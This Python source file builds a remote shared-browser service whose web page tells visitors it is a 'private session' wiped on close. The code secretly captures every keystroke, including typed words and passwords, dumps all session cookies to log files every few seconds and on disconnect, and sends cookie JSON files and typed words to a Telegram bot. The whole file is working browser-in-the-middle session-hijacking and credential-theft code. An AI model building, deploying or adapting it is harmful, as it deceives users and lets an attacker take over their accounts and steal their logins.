#!/usr/bin/env python3
"""
Shared Remote Browser
=====================
Admin  → full Chromium via noVNC (URL bar, extensions, settings) — one admin session
Regular → each user gets a SEPARATE isolated browser session
         - own cookies / storage / history
         - data cleared automatically when they close / disconnect
- Cookie + keystroke logging with timestamps
- Optional Telegram alerts (--telegram-token + --telegram-chat)
- Optional Chrome extensions at launch (--extension)

Usage:
  python3 remote_browser.py
  python3 remote_browser.py --url https://example.com
  python3 remote_browser.py --telegram-token "123:ABC" --telegram-chat "987654321"
  python3 remote_browser.py -e /path/to/unpacked-extension
"""

import os
import sys
import json
import uuid
import signal
import asyncio
import argparse
import subprocess
import urllib.request
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict, Any

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import uvicorn
from playwright.async_api import async_playwright, Browser, BrowserContext, Page, Playwright

# ===================== DEFAULTS =====================
DISPLAY = ":99"
SCREEN = "1920x1080x24"
ADMIN_VNC_PORT = 5900
ADMIN_NOVNC_PORT = 6080
REGULAR_PORT = 8090

COOKIE_LOG = "session_cookies.jsonl"
INPUT_LOG = "session_input.jsonl"
COOKIE_INTERVAL = 4
FRAME_INTERVAL = 0.25
VIEWPORT = {"width": 1920, "height": 1080}
# ====================================================

processes: List[subprocess.Popen] = []

admin_browser: Optional[Browser] = None
admin_context: Optional[BrowserContext] = None
admin_page: Optional[Page] = None
admin_cookies_hash = None

pw: Optional[Playwright] = None
regular_browser: Optional[Browser] = None

regular_sessions: Dict[str, Dict[str, Any]] = {}

TELEGRAM_TOKEN: Optional[str] = None
TELEGRAM_CHAT: Optional[str] = None

START_URL = "https://www.google.com"
EXTENSION_PATHS: List[str] = []

app = FastAPI(title="Remote Shared Browser")


def start_proc(cmd: list, name: str) -> subprocess.Popen:
    print(f"[+] {name}")
    p = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    processes.append(p)
    return p


def cleanup(*_):
    print("\n[!] Shutting down...")
    for p in processes:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
        except Exception:
            pass
    sys.exit(0)


signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)


def telegram_enabled() -> bool:
    return bool(TELEGRAM_TOKEN and TELEGRAM_CHAT)


def _tg_request(method: str, data: dict):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/{method}"
    body = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(url, data=body, method="POST")
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read()


async def tg_send(text: str, disable_preview: bool = True):
    if not telegram_enabled():
        return
    chunks = []
    while text:
        chunks.append(text[:4000])
        text = text[4000:]
    for chunk in chunks:
        try:
            await asyncio.to_thread(
                _tg_request,
                "sendMessage",
                {
                    "chat_id": TELEGRAM_CHAT,
                    "text": chunk,
                    "disable_web_page_preview": str(disable_preview).lower(),
                },
            )
        except Exception as e:
            print(f"[Telegram] send failed: {e}")


async def tg_send_document(filename: str, content: bytes, caption: str = ""):
    if not telegram_enabled():
        return
    try:
        import io
        boundary = "----RemoteBrowserBoundary7MA4YWxk"
        body = io.BytesIO()

        def part(name, value, filename=None, content_type=None):
            body.write(f"--{boundary}\r\n".encode())
            if filename:
                body.write(
                    f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
                )
                if content_type:
                    body.write(f"Content-Type: {content_type}\r\n".encode())
            else:
                body.write(f'Content-Disposition: form-data; name="{name}"\r\n'.encode())
            body.write(b"\r\n")
            if isinstance(value, str):
                body.write(value.encode())
            else:
                body.write(value)
            body.write(b"\r\n")

        part("chat_id", str(TELEGRAM_CHAT))
        if caption:
            part("caption", caption[:1000])
        part("document", content, filename=filename, content_type="application/json")
        body.write(f"--{boundary}--\r\n".encode())

        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        req = urllib.request.Request(
            url,
            data=body.getvalue(),
            method="POST",
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        await asyncio.to_thread(lambda: urllib.request.urlopen(req, timeout=30).read())
    except Exception as e:
        print(f"[Telegram] document failed: {e}")


def cookies_hash(cookies) -> int:
    key = sorted((c.get("name"), c.get("domain"), c.get("value")) for c in cookies)
    return hash(tuple(key))


async def save_cookies(
    context: BrowserContext,
    reason: str,
    session_id: str,
    role: str,
    last_hash_holder: dict,
):
    cookies = await context.cookies()
    h = cookies_hash(cookies)
    if reason not in ("startup", "disconnect") and h == last_hash_holder.get("hash"):
        return
    last_hash_holder["hash"] = h

    entry = {
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "date": datetime.now().strftime("%Y-%m-%d"),
        "time": datetime.now().strftime("%H:%M:%S"),
        "reason": reason,
        "session_id": session_id,
        "role": role,
        "cookie_count": len(cookies),
        "cookies": cookies,
    }
    with open(COOKIE_LOG, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    print(f"[Cookies] session={session_id[:8]} role={role} count={len(cookies)} ({reason})")

    if telegram_enabled():
        domains = sorted({c.get("domain", "") for c in cookies})
        summary = (
            f"Cookies ({reason})\n"
            f"Role: {role}\n"
            f"Session: {session_id[:12]}...\n"
            f"Time: {entry['date']} {entry['time']}\n"
            f"Count: {len(cookies)}\n"
            f"Domains: {', '.join(domains[:12])}"
            + (" ..." if len(domains) > 12 else "")
        )
        await tg_send(summary)
        payload = json.dumps(entry, ensure_ascii=False, indent=2).encode("utf-8")
        fname = f"cookies_{role}_{entry['date']}_{entry['time'].replace(':', '-')}.json"
        await tg_send_document(fname, payload, caption=f"Cookies {role} ({reason})")


def log_input(event_type: str, data: dict):
    entry = {
        "timestamp": datetime.now().isoformat(timespec="seconds"),
        "date": datetime.now().strftime("%Y-%m-%d"),
        "time": datetime.now().strftime("%H:%M:%S"),
        "type": event_type,
        **data,
    }
    with open(INPUT_LOG, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def handle_keystroke(key: str, source: str, session_id: str, word_buf: list):
    now = datetime.now()
    log_input("key", {"key": key, "source": source, "session_id": session_id})

    async def _notify_word(word: str, src: str):
        if telegram_enabled():
            await tg_send(
                f"Word typed\n"
                f"Source: {src}\n"
                f"Session: {session_id[:12]}...\n"
                f"Time: {now.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Word: {word}"
            )

    if key == "Backspace":
        if word_buf:
            word_buf.pop()
    elif key == "Enter":
        word = "".join(word_buf).strip()
        if word:
            log_input("word", {"word": word, "source": source, "session_id": session_id})
            print(f"[Input] word: {word!r} ({source}/{session_id[:8]})")
            asyncio.create_task(_notify_word(word, source))
        log_input("enter", {"source": source, "session_id": session_id})
        if telegram_enabled():
            asyncio.create_task(
                tg_send(
                    f"Enter\nSource: {source}\nSession: {session_id[:12]}...\n"
                    f"Time: {now.strftime('%Y-%m-%d %H:%M:%S')}"
                )
            )
        word_buf.clear()
    elif key == " ":
        word = "".join(word_buf).strip()
        if word:
            log_input("word", {"word": word, "source": source, "session_id": session_id})
            print(f"[Input] word: {word!r} ({source}/{session_id[:8]})")
            asyncio.create_task(_notify_word(word, source))
        word_buf.clear()
    elif len(key) == 1:
        word_buf.append(key)


REGULAR_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<title>Shared Browser – Team View</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  html, body {
    width: 100%; height: 100%; overflow: hidden;
    background: #111; color: #eee;
    font-family: system-ui, -apple-system, sans-serif;
    touch-action: none; overscroll-behavior: none;
  }
  #bar {
    min-height: 40px;
    background: #0d0d0d;
    display: flex; align-items: center;
    padding: 0 12px;
    padding-top: env(safe-area-inset-top);
    height: calc(40px + env(safe-area-inset-top));
    font-size: 13px; border-bottom: 1px solid #333;
  }
  #bar .title { opacity: 0.75; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  #status { margin-left: auto; flex-shrink: 0; padding-left: 10px; }
  #status.ok { color: #4caf50; }
  #status.bad { color: #f44336; }
  #viewport {
    position: relative;
    width: 100%;
    height: calc(100% - 40px - env(safe-area-inset-top));
    background: #000; overflow: hidden; touch-action: none;
  }
  #frame {
    position: absolute; top: 0; left: 0;
    transform-origin: 0 0;
    pointer-events: none;
    user-select: none; -webkit-user-select: none;
  }
  @media (max-width: 480px) {
    #bar { font-size: 12px; }
    #bar .title { max-width: 55vw; }
  }
</style>
</head>
<body>
  <div id="bar">
    <span class="title">Shared Browser · Your private session</span>
    <span id="status" class="bad">Connecting…</span>
  </div>
  <div id="viewport">
    <img id="frame" draggable="false" alt="">
  </div>
<script>
const img = document.getElementById('frame');
const statusEl = document.getElementById('status');
const viewport = document.getElementById('viewport');
let ws, scale = 1, offsetX = 0, offsetY = 0, frameW = 1920, frameH = 1080;

function connect() {
  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  ws = new WebSocket(`${proto}://${location.host}/ws`);
  ws.binaryType = 'arraybuffer';
  ws.onopen = () => { statusEl.textContent = 'Connected (private session)'; statusEl.className = 'ok'; };
  ws.onclose = () => {
    statusEl.textContent = 'Session ended – reconnecting creates a new empty session…';
    statusEl.className = 'bad';
    setTimeout(connect, 1500);
  };
  ws.onerror = () => ws.close();
  ws.onmessage = (ev) => {
    if (typeof ev.data === 'string') {
      try {
        const msg = JSON.parse(ev.data);
        if (msg.type === 'meta') {
          frameW = msg.width || 1920; frameH = msg.height || 1080; fit();
        }
      } catch (_) {}
      return;
    }
    const blob = new Blob([ev.data], { type: 'image/jpeg' });
    const url = URL.createObjectURL(blob);
    img.onload = () => URL.revokeObjectURL(url);
    img.src = url;
  };
}

function fit() {
  const vw = viewport.clientWidth, vh = viewport.clientHeight;
  if (vw <= 0 || vh <= 0) return;
  scale = Math.min(vw / frameW, vh / frameH);
  const drawW = frameW * scale, drawH = frameH * scale;
  offsetX = (vw - drawW) / 2; offsetY = (vh - drawH) / 2;
  img.style.width = frameW + 'px'; img.style.height = frameH + 'px';
  img.style.transform = `translate(${offsetX}px, ${offsetY}px) scale(${scale})`;
}
window.addEventListener('resize', fit);
window.addEventListener('orientationchange', () => setTimeout(fit, 100));

function toPageCoords(clientX, clientY) {
  const x = (clientX - offsetX) / scale;
  const y = (clientY - offsetY) / scale;
  return {
    x: Math.max(0, Math.min(frameW, Math.round(x))),
    y: Math.max(0, Math.min(frameH, Math.round(y)))
  };
}
function send(obj) {
  if (ws && ws.readyState === 1) ws.send(JSON.stringify(obj));
}

viewport.addEventListener('mousedown', e => {
  e.preventDefault();
  const {x,y} = toPageCoords(e.clientX, e.clientY);
  send({ type: 'mouse', action: 'down', x, y, button: e.button });
});
viewport.addEventListener('mouseup', e => {
  e.preventDefault();
  const {x,y} = toPageCoords(e.clientX, e.clientY);
  send({ type: 'mouse', action: 'up', x, y, button: e.button });
});
viewport.addEventListener('mousemove', e => {
  const {x,y} = toPageCoords(e.clientX, e.clientY);
  send({ type: 'mouse', action: 'move', x, y });
});
viewport.addEventListener('wheel', e => {
  e.preventDefault();
  const {x,y} = toPageCoords(e.clientX, e.clientY);
  send({ type: 'wheel', x, y, deltaX: e.deltaX, deltaY: e.deltaY });
}, { passive: false });
viewport.addEventListener('contextmenu', e => e.preventDefault());

let lastTouchX = 0, lastTouchY = 0;
viewport.addEventListener('touchstart', e => {
  e.preventDefault();
  if (e.touches.length !== 1) return;
  const t = e.touches[0];
  lastTouchX = t.clientX; lastTouchY = t.clientY;
  const {x,y} = toPageCoords(t.clientX, t.clientY);
  send({ type: 'mouse', action: 'move', x, y });
  send({ type: 'mouse', action: 'down', x, y, button: 0 });
}, { passive: false });
viewport.addEventListener('touchmove', e => {
  e.preventDefault();
  if (e.touches.length !== 1) return;
  const t = e.touches[0];
  const {x,y} = toPageCoords(t.clientX, t.clientY);
  send({ type: 'mouse', action: 'move', x, y });
  lastTouchX = t.clientX; lastTouchY = t.clientY;
}, { passive: false });
viewport.addEventListener('touchend', e => {
  e.preventDefault();
  const {x,y} = toPageCoords(lastTouchX, lastTouchY);
  send({ type: 'mouse', action: 'up', x, y, button: 0 });
}, { passive: false });
viewport.addEventListener('touchcancel', e => {
  const {x,y} = toPageCoords(lastTouchX, lastTouchY);
  send({ type: 'mouse', action: 'up', x, y, button: 0 });
});

window.addEventListener('keydown', e => {
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
  send({ type: 'key', action: 'down', key: e.key, code: e.code });
});
window.addEventListener('keyup', e => {
  send({ type: 'key', action: 'up', key: e.key, code: e.code });
});
document.addEventListener('gesturestart', e => e.preventDefault());
document.addEventListener('gesturechange', e => e.preventDefault());

connect();
setTimeout(fit, 50);
</script>
</body>
</html>
"""


@app.get("/")
async def regular_ui():
    return HTMLResponse(REGULAR_HTML)


async def destroy_regular_session(session_id: str):
    state = regular_sessions.pop(session_id, None)
    if not state:
        return
    state["alive"] = False
    ctx = state.get("context")
    page = state.get("page")
    try:
        if ctx:
            await save_cookies(
                ctx, "disconnect", session_id, "regular", state.get("cookie_hash") or {"hash": None}
            )
    except Exception as e:
        print(f"[session] final cookie save failed: {e}")
    try:
        if page:
            await page.close()
    except Exception:
        pass
    try:
        if ctx:
            await ctx.close()
    except Exception as e:
        print(f"[session] context close failed: {e}")
    print(f"[session] destroyed {session_id[:12]}... (data cleared)")


@app.websocket("/ws")
async def regular_ws(ws: WebSocket):
    await ws.accept()

    if not regular_browser:
        await ws.close(code=1013)
        return

    session_id = str(uuid.uuid4())
    word_buf: list = []
    cookie_hash_holder = {"hash": None}

    context = await regular_browser.new_context(
        viewport=VIEWPORT,
        storage_state=None,
    )
    page = await context.new_page()

    async def on_page_key(key: str):
        handle_keystroke(key, "regular", session_id, word_buf)

    await page.expose_function("__logKey", on_page_key)
    await page.add_init_script("""
        document.addEventListener('keydown', (e) => {
            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === ' ') {
                window.__logKey(e.key);
            }
        }, true);
    """)

    await page.goto(START_URL)
    await save_cookies(context, "startup", session_id, "regular", cookie_hash_holder)

    state = {
        "context": context,
        "page": page,
        "ws": ws,
        "alive": True,
        "word_buf": word_buf,
        "cookie_hash": cookie_hash_holder,
        "session_id": session_id,
    }
    regular_sessions[session_id] = state
    print(f"[session] created regular {session_id[:12]}... (total={len(regular_sessions)})")

    async def session_frame_loop():
        while state["alive"]:
            try:
                if page and not page.is_closed():
                    raw = await page.screenshot(type="jpeg", quality=65)
                    try:
                        await ws.send_bytes(raw)
                    except Exception:
                        break
            except Exception as e:
                if state["alive"]:
                    print(f"[frame/{session_id[:8]}] {e}")
            await asyncio.sleep(FRAME_INTERVAL)

    async def session_cookie_loop():
        while state["alive"]:
            try:
                if context:
                    await save_cookies(
                        context, "change", session_id, "regular", cookie_hash_holder
                    )
            except Exception as e:
                if state["alive"]:
                    print(f"[cookie/{session_id[:8]}] {e}")
            await asyncio.sleep(COOKIE_INTERVAL)

    frame_task = asyncio.create_task(session_frame_loop())
    cookie_task = asyncio.create_task(session_cookie_loop())

    try:
        vp = page.viewport_size or VIEWPORT
        await ws.send_json({"type": "meta", "width": vp["width"], "height": vp["height"]})

        while True:
            raw = await ws.receive_text()
            msg = json.loads(raw)
            if not page or page.is_closed():
                break

            if msg["type"] == "mouse":
                x, y = msg["x"], msg["y"]
                action = msg["action"]
                button = {0: "left", 1: "middle", 2: "right"}.get(msg.get("button", 0), "left")
                if action == "move":
                    await page.mouse.move(x, y)
                elif action == "down":
                    await page.mouse.move(x, y)
                    await page.mouse.down(button=button)
                elif action == "up":
                    await page.mouse.move(x, y)
                    await page.mouse.up(button=button)

            elif msg["type"] == "wheel":
                await page.mouse.move(msg["x"], msg["y"])
                await page.mouse.wheel(msg.get("deltaX", 0), msg.get("deltaY", 0))

            elif msg["type"] == "key":
                key = msg.get("key") or msg.get("code")
                if msg["action"] == "down":
                    await page.keyboard.down(key)
                    handle_keystroke(key, "regular", session_id, word_buf)
                else:
                    await page.keyboard.up(key)

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[ws/{session_id[:8]}] {e}")
    finally:
        state["alive"] = False
        frame_task.cancel()
        cookie_task.cancel()
        await destroy_regular_session(session_id)


async def admin_cookie_loop():
    holder = {"hash": admin_cookies_hash}
    while True:
        try:
            if admin_context:
                await save_cookies(admin_context, "change", "admin", "admin", holder)
        except Exception as e:
            print(f"[admin-cookie] {e}")
        await asyncio.sleep(COOKIE_INTERVAL)


async def start_stack(start_url: str, extension_paths: List[str]):
    global pw, admin_browser, admin_context, admin_page, regular_browser
    global START_URL, EXTENSION_PATHS, admin_cookies_hash

    START_URL = start_url
    EXTENSION_PATHS = extension_paths

    for f in [f"/tmp/.X{DISPLAY[1:]}-lock", f"/tmp/.X11-unix/X{DISPLAY[1:]}"]:
        try:
            os.remove(f)
        except FileNotFoundError:
            pass

    start_proc(["Xvfb", DISPLAY, "-screen", "0", SCREEN, "-ac"], "Xvfb")
    await asyncio.sleep(1)
    os.environ["DISPLAY"] = DISPLAY

    start_proc(["fluxbox"], "fluxbox")
    await asyncio.sleep(0.4)

    start_proc([
        "x11vnc", "-display", DISPLAY,
        "-rfbport", str(ADMIN_VNC_PORT),
        "-forever", "-shared", "-nopw",
        "-xkb", "-noxdamage", "-quiet",
    ], "x11vnc (Admin)")

    start_proc([
        "websockify", "--web", "/usr/share/novnc",
        str(ADMIN_NOVNC_PORT), f"localhost:{ADMIN_VNC_PORT}",
    ], f"noVNC Admin :{ADMIN_NOVNC_PORT}")

    pw = await async_playwright().start()

    args = [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--start-maximized",
        "--ozone-platform=x11",
    ]
    if extension_paths:
        joined = ",".join(extension_paths)
        args += [
            f"--disable-extensions-except={joined}",
            f"--load-extension={joined}",
        ]
        print(f"[+] Loading extensions (Admin): {extension_paths}")

    admin_browser = await pw.chromium.launch(headless=False, args=args)
    admin_context = await admin_browser.new_context(viewport=VIEWPORT)
    admin_page = await admin_context.new_page()

    admin_word_buf: list = []

    async def on_admin_key(key: str):
        handle_keystroke(key, "admin", "admin", admin_word_buf)

    await admin_page.expose_function("__logKey", on_admin_key)
    await admin_page.add_init_script("""
        document.addEventListener('keydown', (e) => {
            if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace' || e.key === ' ') {
                window.__logKey(e.key);
            }
        }, true);
    """)

    await admin_page.goto(start_url)
    holder = {"hash": None}
    await save_cookies(admin_context, "startup", "admin", "admin", holder)
    admin_cookies_hash = holder.get("hash")

    regular_args = [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
    ]
    if extension_paths:
        joined = ",".join(extension_paths)
        regular_args += [
            f"--disable-extensions-except={joined}",
            f"--load-extension={joined}",
        ]

    regular_browser = await pw.chromium.launch(headless=True, args=regular_args)

    print("\n" + "=" * 72)
    print(" Remote Browser ready")
    print("-" * 72)
    print(f" ADMIN   (full browser) : http://YOUR_SERVER_IP:{ADMIN_NOVNC_PORT}/vnc.html")
    print(f" REGULAR (private sess) : http://YOUR_SERVER_IP:{REGULAR_PORT}/")
    print(f" Cookie log             : {COOKIE_LOG}")
    print(f" Typed text log         : {INPUT_LOG}")
    print(" Regular users: EACH gets a separate session; data wiped on close")
    if telegram_enabled():
        print(f" Telegram alerts         : ON (chat {TELEGRAM_CHAT})")
    else:
        print(f" Telegram alerts         : OFF")
    if extension_paths:
        print(f" Extensions              : {len(extension_paths)} path(s)")
    print("=" * 72 + "\n")

    asyncio.create_task(admin_cookie_loop())


def main():
    global TELEGRAM_TOKEN, TELEGRAM_CHAT

    parser = argparse.ArgumentParser(
        description="Remote Browser — Admin full UI + Regular private sessions (cleared on close)"
    )
    parser.add_argument("--url", default="https://www.google.com", help="Start URL")
    parser.add_argument(
        "--extension", "-e", action="append", default=[],
        help="Path to unpacked extension folder (repeatable)",
    )
    parser.add_argument("--host", default="0.0.0.0", help="Bind host for Regular UI")
    parser.add_argument("--port", type=int, default=REGULAR_PORT, help="Port for Regular UI")
    parser.add_argument("--telegram-token", default=None, help="Telegram bot token")
    parser.add_argument("--telegram-chat", default=None, help="Telegram chat ID")
    args = parser.parse_args()

    TELEGRAM_TOKEN = args.telegram_token
    TELEGRAM_CHAT = args.telegram_chat

    if (TELEGRAM_TOKEN and not TELEGRAM_CHAT) or (TELEGRAM_CHAT and not TELEGRAM_TOKEN):
        print("[!] Both --telegram-token and --telegram-chat are required for Telegram")
        sys.exit(1)

    if telegram_enabled():
        print(f"[+] Telegram notifications enabled -> chat {TELEGRAM_CHAT}")

    valid_exts = []
    for p in args.extension:
        path = Path(p).resolve()
        if not path.is_dir() or not (path / "manifest.json").exists():
            print(f"[!] Invalid extension (need folder with manifest.json): {path}")
            sys.exit(1)
        valid_exts.append(str(path))

    async def run():
        await start_stack(args.url, valid_exts)
        config = uvicorn.Config(app, host=args.host, port=args.port, log_level="info")
        server = uvicorn.Server(config)
        await server.serve()

    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        cleanup()


if __name__ == "__main__":
    main()
